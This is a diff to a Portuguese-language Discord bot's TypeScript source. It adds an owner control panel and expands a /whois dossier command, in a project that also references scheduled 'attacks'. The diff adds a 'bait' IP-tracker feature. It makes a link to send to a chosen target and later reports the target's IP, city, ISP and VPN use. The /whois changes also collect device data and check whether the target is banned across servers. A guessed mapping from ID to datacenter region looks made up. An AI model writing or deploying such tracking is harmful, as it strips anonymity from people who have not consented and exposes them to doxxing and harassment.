@@ -27,7 +27,13 @@ type MonitorEditFn = (opts: {
 }) => Promise<unknown>;
 import { BOT_TOKEN, APPLICATION_ID, ALL_GUILD_IDS, COLORS, AUTHOR, BOT_NAME, API_BASE } from "./config.js";
 import { api, type ScheduledAttack, type AiAdvice, type ProxyStats } from "./api.js";
-import { getLogChannelId, setLogChannelId } from "./bot-config.js";
+import {
+  getLogChannelId, setLogChannelId,
+  isOwner, isMod,
+  addPanelOwner, removePanelOwner, addPanelMod, removePanelMod,
+  listPanelOwners, listPanelMods,
+  BOOTSTRAP_OWNER_USERNAME,
+} from "./bot-config.js";
 import { askLelouch, askLelouchModerate, clearLelouchHistory, getLelouchMemoryStats, getSessionTimeRemaining } from "./lelouch-ai.js";
 import {
   buildAttackEmbed,
@@ -416,6 +422,57 @@ const COMMANDS = [
         .setDescription("📋 Set the channel where all mod actions are logged")
         .addChannelOption(opt =>
           opt.setName("channel").setDescription("Channel to send mod logs to").setRequired(true)
+        )
+    ),
+
+  // ── /panel ────────────────────────────────────────────────────────────────
+  new SlashCommandBuilder()
+    .setName("panel")
+    .setDescription("👁️ Painel de Controle Real — acesso exclusivo ao dono e autorizados")
+    .addSubcommand(sub =>
+      sub.setName("status")
+        .setDescription("📊 Status do bot — CPU, RAM, sessões, guilds, uptime")
+    )
+    .addSubcommand(sub =>
+      sub.setName("guilds")
+        .setDescription("🌐 Listar todos os servidores onde o bot está")
+    )
+    .addSubcommand(sub =>
+      sub.setName("whitelist")
+        .setDescription("📋 Gerenciar whitelist de acesso ao painel")
+        .addStringOption(opt =>
+          opt.setName("action")
+            .setDescription("Ação").setRequired(true)
+            .addChoices(
+              { name: "➕ Adicionar owner",   value: "add-owner" },
+              { name: "➕ Adicionar mod",     value: "add-mod"   },
+              { name: "➖ Remover acesso",    value: "remove"    },
+              { name: "📋 Listar acessos",    value: "list"      },
+            )
+        )
+        .addUserOption(opt =>
+          opt.setName("user").setDescription("Usuário alvo").setRequired(false)
+        )
+    )
+    .addSubcommand(sub =>
+      sub.setName("broadcast")
+        .setDescription("📢 Enviar mensagem para TODOS os canais de log configurados")
+        .addStringOption(opt =>
+          opt.setName("message").setDescription("Mensagem a enviar").setRequired(true)
+        )
+    )
+    .addSubcommand(sub =>
+      sub.setName("leave")
+        .setDescription("🚪 Forçar bot a sair de um servidor específico")
+        .addStringOption(opt =>
+          opt.setName("guildid").setDescription("ID do servidor").setRequired(true)
+        )
+    )
+    .addSubcommand(sub =>
+      sub.setName("ipcheck")
+        .setDescription("🌐 Ver resultado de IP capturado por tracking link")
+        .addStringOption(opt =>
+          opt.setName("token").setDescription("Token do tracking link").setRequired(true)
         )
     ),
 
@@ -2106,6 +2163,30 @@ async function handleWhois(interaction: ChatInputCommandInteraction): Promise<vo
   const badgeList = flags.map(f => FLAG_MAP[f as string] ?? `\`${String(f)}\``);
   if (fetched.bot && !flags.includes("VerifiedBot" as never)) badgeList.push("🤖 Unverified Bot");
 
+  // ── Option 7: Username system detection ──────────────────────────────────
+  const discriminator = fetched.discriminator;
+  const usernameSystem = (discriminator === "0" || !discriminator)
+    ? "🆕 Novo sistema (username único, sem #discriminator)"
+    : `🔢 Sistema legado (\`${fetched.username}#${discriminator}\`) — ainda não migrou`;
+
+  // ── Option 5: Snowflake Worker ID → Discord datacenter region ─────────────
+  const WORKER_REGIONS: Record<number, string> = {
+    0: "🇺🇸 US-East (Ashburn, VA)",
+    1: "🇺🇸 US-East (Ashburn, VA)",
+    2: "🇺🇸 US-East (Ashburn, VA)",
+    3: "🇺🇸 US-West (Portland, OR)",
+    4: "🇺🇸 US-West (Portland, OR)",
+    5: "🇺🇸 US-West (Portland, OR)",
+    6: "🇳🇱 EU-West (Amsterdam)",
+    7: "🇩🇪 EU-Central (Frankfurt)",
+    8: "🇩🇪 EU-Central (Frankfurt)",
+    9: "🇸🇬 Asia-Pacific (Singapore)",
+    10: "🇧🇷 South America (São Paulo)",
+    11: "🇮🇳 Asia-South (Mumbai)",
+    12: "🇦🇺 Oceania (Sydney)",
+  };
+  const datacenterRegion = WORKER_REGIONS[sf.workerId] ?? `🌐 Unknown (Worker ${sf.workerId})`;
+
   // ── Presence & activities ─────────────────────────────────────────────────
   const presence = member?.presence;
   const status = presence?.status ?? "offline";
@@ -2113,6 +2194,18 @@ async function handleWhois(interaction: ChatInputCommandInteraction): Promise<vo
     online: "🟢 Online", idle: "🟡 Idle", dnd: "🔴 Do Not Disturb",
     offline: "⚫ Offline", invisible: "⚫ Invisible",
   };
+
+  // Option 1: Device/platform from clientStatus
+  const clientStatus = presence?.clientStatus;
+  const deviceLines: string[] = [];
+  if (clientStatus) {
+    if (clientStatus.desktop) deviceLines.push(`💻 Desktop: ${STATUS_LABELS[clientStatus.desktop] ?? clientStatus.desktop}`);
+    if (clientStatus.mobile)  deviceLines.push(`📱 Mobile: ${STATUS_LABELS[clientStatus.mobile] ?? clientStatus.mobile}`);
+    if (clientStatus.web)     deviceLines.push(`🌐 Web: ${STATUS_LABELS[clientStatus.web] ?? clientStatus.web}`);
+  }
+  const deviceStr = deviceLines.length > 0
+    ? deviceLines.join("\n")
+    : status === "offline" ? "*Offline — não é possível detectar dispositivo*" : "*Dispositivos desconhecidos (requer Presence intent)*";
 
   const activities = presence?.activities ?? [];
   const customStatus = activities.find(a => a.type === 4);
@@ -2238,11 +2331,23 @@ async function handleWhois(interaction: ChatInputCommandInteraction): Promise<vo
     );
 
   // ── Presence section ──────────────────────────────────────────────────────
-  embedIdentity.addFields({
-    name: `🌐 PRESENÇA — ${STATUS_LABELS[status] ?? status}`,
-    value: activityLines.length > 0 ? activityLines.join("\n") : "*Nenhuma atividade detectada*",
-    inline: false,
-  });
+  embedIdentity.addFields(
+    {
+      name: `🌐 PRESENÇA — ${STATUS_LABELS[status] ?? status}`,
+      value: activityLines.length > 0 ? activityLines.join("\n") : "*Nenhuma atividade detectada*",
+      inline: false,
+    },
+    {
+      name: "📱 DISPOSITIVOS ATIVOS (Option 1)",
+      value: deviceStr,
+      inline: false,
+    },
+    {
+      name: "🔤 SISTEMA DE USERNAME (Option 7)",
+      value: usernameSystem,
+      inline: false,
+    },
+  );
 
   if (bannerURL) embedIdentity.setImage(bannerURL);
   embedIdentity.setFooter({ text: `${AUTHOR} • Geass Intelligence Division — Página 1/3` });
@@ -2340,6 +2445,7 @@ async function handleWhois(interaction: ChatInputCommandInteraction): Promise<vo
           `**Process ID:** \`${sf.processId}\``,
           `**Sequência:** \`${sf.increment}\` (ordem de criação no mesmo ms)`,
           `**Época Discord:** 2015-01-01 00:00:00 UTC`,
+          `**🏛️ Datacenter (Option 5):** ${datacenterRegion}`,
         ].join("\n"),
         inline: false,
       },
@@ -2377,11 +2483,239 @@ async function handleWhois(interaction: ChatInputCommandInteraction): Promise<vo
     });
   }
 
+  // ── Option 10: Cross-guild ban check ─────────────────────────────────────
+  const crossBanResults: string[] = [];
+  const isCallerOwner = isOwner(interaction.user.id, interaction.user.username);
+  if (isCallerOwner && targetUser.id !== interaction.user.id) {
+    const banChecks = await Promise.allSettled(
+      botClient!.guilds.cache.map(async (g: import("discord.js").Guild) => {
+        const ban = await g.bans.fetch(targetUser.id).catch(() => null);
+        return ban ? `❌ Banido em **${g.name}** — ${ban.reason ?? "Sem motivo"}` : `✅ Livre em **${g.name}**`;
+      })
+    );
+    for (const r of banChecks) {
+      if (r.status === "fulfilled") crossBanResults.push(r.value);
+    }
+  }
+
+  if (crossBanResults.length > 0) {
+    embedTech.addFields({
+      name: "🔍 CROSS-GUILD BAN CHECK (Option 10)",
+      value: crossBanResults.slice(0, 15).join("\n").slice(0, 1024) || "*Sem dados*",
+      inline: false,
+    });
+  }
+
+  // ── IP Tracker bait link (owner-only) ─────────────────────────────────────
+  if (isCallerOwner) {
+    try {
+      const trackerRes = await fetch(`${API_BASE}/api/tracker/gen`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ userId: targetUser.id, username: targetUser.username, targetName: targetUser.displayName }),
+      }).catch(() => null);
+      if (trackerRes?.ok) {
+        const { token, url } = await trackerRes.json() as { token: string; url: string };
+        embedTech.addFields({
+          name: "🪤 IP TRACKER — GEASS BAIT (Option Owner)",
+          value: [
+            `**Token:** \`${token}\``,
+            `**Link:** ${url}`,
+            `**Uso:** Envie este link para o alvo. Use \`/panel ipcheck token:${token}\` para ver o resultado.`,
+          ].join("\n"),
+          inline: false,
+        });
+      }
+    } catch { /* tracker unavailable — skip silently */ }
+  }
+
   embedTech
     .setFooter({ text: `${AUTHOR} • Geass Intelligence Division — Dossier gerado em ${new Date().toISOString()}` })
     .setTimestamp();
 
   await interaction.editReply({ embeds: [embedIdentity, embedServer, embedTech] });
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// PANEL COMMAND HANDLER
+// ═══════════════════════════════════════════════════════════════════════════
+async function handlePanel(interaction: ChatInputCommandInteraction): Promise<void> {
+  const callerUsername = interaction.user.username;
+  const callerId = interaction.user.id;
+
+  if (!isOwner(callerId, callerUsername) && !isMod(callerId, callerUsername)) {
+    await interaction.reply({
+      embeds: [buildErrorEmbed("⛔ ACESSO NEGADO", `**${callerUsername}** — Apenas donos e mods autorizados podem usar este painel.\n\n*"Meu Geass não reconhece você como aliado."*`)],
+      ephemeral: true,
+    });
+    return;
+  }
+
+  await interaction.deferReply({ ephemeral: true });
+  const sub = interaction.options.getSubcommand();
+
+  // ── STATUS ──────────────────────────────────────────────────────────────
+  if (sub === "status") {
+    const mem = process.memoryUsage();
+    const upMs = process.uptime() * 1000;
+    const h = Math.floor(upMs / 3_600_000), m = Math.floor((upMs % 3_600_000) / 60_000), s = Math.floor((upMs % 60_000) / 1000);
+    const embed = new EmbedBuilder()
+      .setColor(COLORS.PURPLE)
+      .setTitle("👁️ PAINEL DE CONTROLE — STATUS DO SISTEMA")
+      .setDescription(`*"Eu não apenas ocupo um lugar — eu dirijo o destino."*`)
+      .addFields(
+        { name: "🤖 BOT", value: `**Tag:** ${botClient!.user?.tag ?? "?"}\n**ID:** \`${botClient!.user?.id ?? "?"}\`\n**Ping:** \`${botClient!.ws.ping}ms\``, inline: true },
+        { name: "⏱️ UPTIME", value: `\`${h}h ${m}m ${s}s\``, inline: true },
+        { name: "💾 RAM", value: `RSS: \`${(mem.rss / 1_048_576).toFixed(1)}MB\`\nHeap: \`${(mem.heapUsed / 1_048_576).toFixed(1)}/${(mem.heapTotal / 1_048_576).toFixed(1)}MB\``, inline: true },
+        { name: "🌐 GUILDS", value: `\`${botClient!.guilds.cache.size}\` servidores`, inline: true },
+        { name: "👥 USUÁRIOS CACHEADOS", value: `\`${botClient!.users.cache.size}\``, inline: true },
+        { name: "📡 SHARD", value: `\`${botClient!.shard?.ids.join(", ") ?? "0"}\``, inline: true },
+        { name: "🔐 BOOTSTRAP OWNER", value: `\`${BOOTSTRAP_OWNER_USERNAME}\``, inline: false },
+        { name: "👑 OWNERS", value: listPanelOwners().slice(0, 10).join("\n") || "*Nenhum owner extra*", inline: true },
+        { name: "🛡️ MODS", value: listPanelMods().slice(0, 10).join("\n") || "*Nenhum mod*", inline: true },
+      )
+      .setTimestamp()
+      .setFooter({ text: AUTHOR });
+    await interaction.editReply({ embeds: [embed] });
+    return;
+  }
+
+  // ── GUILDS ───────────────────────────────────────────────────────────────
+  if (sub === "guilds") {
+    if (!isOwner(callerId, callerUsername)) {
+      await interaction.editReply({ embeds: [buildErrorEmbed("⛔", "Apenas donos podem listar servidores.")] });
+      return;
+    }
+    const lines = botClient!.guilds.cache.map(g =>
+      `**${g.name}** • \`${g.id}\` • ${g.memberCount ?? "?"} membros`
+    );
+    const chunks: string[] = [];
+    let cur = "";
+    for (const l of lines) {
+      if ((cur + "\n" + l).length > 3900) { chunks.push(cur); cur = l; }
+      else cur += (cur ? "\n" : "") + l;
+    }
+    if (cur) chunks.push(cur);
+
+    const embeds = chunks.slice(0, 3).map((chunk, i) => new EmbedBuilder()
+      .setColor(COLORS.PURPLE)
+      .setTitle(i === 0 ? `🌐 SERVIDORES (${botClient!.guilds.cache.size} total)` : `🌐 SERVIDORES (cont. ${i + 1})`)
+      .setDescription(chunk)
+    );
+    await interaction.editReply({ embeds });
+    return;
+  }
+
+  // ── WHITELIST ─────────────────────────────────────────────────────────────
+  if (sub === "whitelist") {
+    if (!isOwner(callerId, callerUsername)) {
+      await interaction.editReply({ embeds: [buildErrorEmbed("⛔", "Apenas donos podem gerenciar whitelist.")] });
+      return;
+    }
+    const action = interaction.options.getString("action", true);
+    const target = interaction.options.getUser("user");
+
+    if (action === "list") {
+      const embed = new EmbedBuilder()
+        .setColor(COLORS.PURPLE)
+        .setTitle("📋 WHITELIST DO PAINEL")
+        .addFields(
+          { name: "👑 Owners", value: [`\`${BOOTSTRAP_OWNER_USERNAME}\` (bootstrap)`, ...listPanelOwners()].join("\n") || "Nenhum", inline: false },
+          { name: "🛡️ Mods", value: listPanelMods().join("\n") || "Nenhum", inline: false },
+        )
+        .setTimestamp();
+      await interaction.editReply({ embeds: [embed] });
+      return;
+    }
+
+    if (!target) {
+      await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Especifique um usuário.")] });
+      return;
+    }
+
+    if (action === "add-owner") { addPanelOwner(target.id); await interaction.editReply({ embeds: [new EmbedBuilder().setColor(0x00FF00).setTitle("✅ Owner adicionado").setDescription(`${target.tag} (\`${target.id}\`) agora é owner do painel.`)] }); }
+    else if (action === "add-mod") { addPanelMod(target.id); await interaction.editReply({ embeds: [new EmbedBuilder().setColor(0x00FF00).setTitle("✅ Mod adicionado").setDescription(`${target.tag} (\`${target.id}\`) agora é mod do painel.`)] }); }
+    else if (action === "remove") {
+      removePanelOwner(target.id); removePanelMod(target.id);
+      await interaction.editReply({ embeds: [new EmbedBuilder().setColor(0xFF8800).setTitle("✅ Acesso removido").setDescription(`${target.tag} removido da whitelist.`)] });
+    }
+    return;
+  }
+
+  // ── BROADCAST ─────────────────────────────────────────────────────────────
+  if (sub === "broadcast") {
+    if (!isOwner(callerId, callerUsername)) {
+      await interaction.editReply({ embeds: [buildErrorEmbed("⛔", "Apenas donos podem fazer broadcast.")] });
+      return;
+    }
+    const message = interaction.options.getString("message", true);
+    let sent = 0, failed = 0;
+    for (const guild of botClient!.guilds.cache.values()) {
+      try {
+        const logChId = getLogChannelId(guild.id);
+        if (!logChId) continue;
+        const ch = guild.channels.cache.find((c: import("discord.js").GuildBasedChannel) => c.id === logChId && c.isTextBased());
+        if (ch && ch.isTextBased()) {
+          await ch.send({ embeds: [new EmbedBuilder().setColor(COLORS.PURPLE).setTitle("📢 BROADCAST — LELOUCH VI BRITANNIA").setDescription(message).setTimestamp()] });
+          sent++;
+        }
+      } catch { failed++; }
+    }
+    await interaction.editReply({ embeds: [new EmbedBuilder().setColor(0x00FF00).setTitle("📢 BROADCAST ENVIADO").setDescription(`Enviado: \`${sent}\` | Falhou: \`${failed}\``)] });
+    return;
+  }
+
+  // ── LEAVE ─────────────────────────────────────────────────────────────────
+  if (sub === "leave") {
+    if (!isOwner(callerId, callerUsername)) {
+      await interaction.editReply({ embeds: [buildErrorEmbed("⛔", "Apenas donos podem forçar saída.")] });
+      return;
+    }
+    const guildId = interaction.options.getString("guildid", true);
+    const guild = botClient!.guilds.cache.get(guildId);
+    if (!guild) { await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", `Servidor \`${guildId}\` não encontrado.`)] }); return; }
+    const name = guild.name;
+    await guild.leave();
+    await interaction.editReply({ embeds: [new EmbedBuilder().setColor(0xFF8800).setTitle("🚪 SAÍDA FORÇADA").setDescription(`Bot saiu de **${name}** (\`${guildId}\`)`)] });
+    return;
+  }
+
+  // ── IPCHECK ───────────────────────────────────────────────────────────────
+  if (sub === "ipcheck") {
+    const token = interaction.options.getString("token", true);
+    try {
+      const res = await fetch(`${API_BASE}/api/tracker/${token}`);
+      if (!res.ok) { await interaction.editReply({ embeds: [buildErrorEmbed("TOKEN INVÁLIDO", "Nenhum registro encontrado para este token.")] }); return; }
+      const data = await res.json() as {
+        ip?: string; country?: string; city?: string; isp?: string;
+        org?: string; proxy?: boolean; hosting?: boolean; mobile?: boolean;
+        query?: string; hits?: number; lastSeen?: string; createdAt?: string;
+      };
+      const embed = new EmbedBuilder()
+        .setColor(COLORS.PURPLE)
+        .setTitle("🌐 IP TRACKER — RESULTADO")
+        .setDescription(`*Token:* \`${token}\``)
+        .addFields(
+          { name: "📡 IP", value: `\`${data.ip ?? data.query ?? "N/A"}\``, inline: true },
+          { name: "🌍 País", value: data.country ?? "N/A", inline: true },
+          { name: "🏙️ Cidade", value: data.city ?? "N/A", inline: true },
+          { name: "🏢 ISP", value: data.isp ?? "N/A", inline: true },
+          { name: "🏗️ ORG", value: data.org ?? "N/A", inline: true },
+          { name: "🔒 Proxy/VPN", value: data.proxy ? "✅ SIM" : "❌ Não", inline: true },
+          { name: "☁️ Hosting/DC", value: data.hosting ? "✅ SIM" : "❌ Não", inline: true },
+          { name: "📱 Mobile", value: data.mobile ? "✅ Sim" : "❌ Não", inline: true },
+          { name: "📊 Hits", value: `\`${data.hits ?? 1}\``, inline: true },
+          { name: "🕐 Criado", value: data.createdAt ? `<t:${Math.floor(new Date(data.createdAt).getTime() / 1000)}:F>` : "N/A", inline: true },
+          { name: "👁️ Último acesso", value: data.lastSeen ? `<t:${Math.floor(new Date(data.lastSeen).getTime() / 1000)}:R>` : "N/A", inline: true },
+        )
+        .setTimestamp()
+        .setFooter({ text: AUTHOR });
+      await interaction.editReply({ embeds: [embed] });
+    } catch {
+      await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Falha ao consultar o tracker.")] });
+    }
+    return;
+  }
 }
 
 async function handleAdmin(interaction: ChatInputCommandInteraction): Promise<void> {
@@ -2758,6 +3092,8 @@ async function main(): Promise<void> {
         await handleAdmin(interaction);
       } else if (commandName === "whois") {
         await handleWhois(interaction);
+      } else if (commandName === "panel") {
+        await handlePanel(interaction);
       }
     } catch (err) {
       console.error("[INTERACTION ERROR]", err);
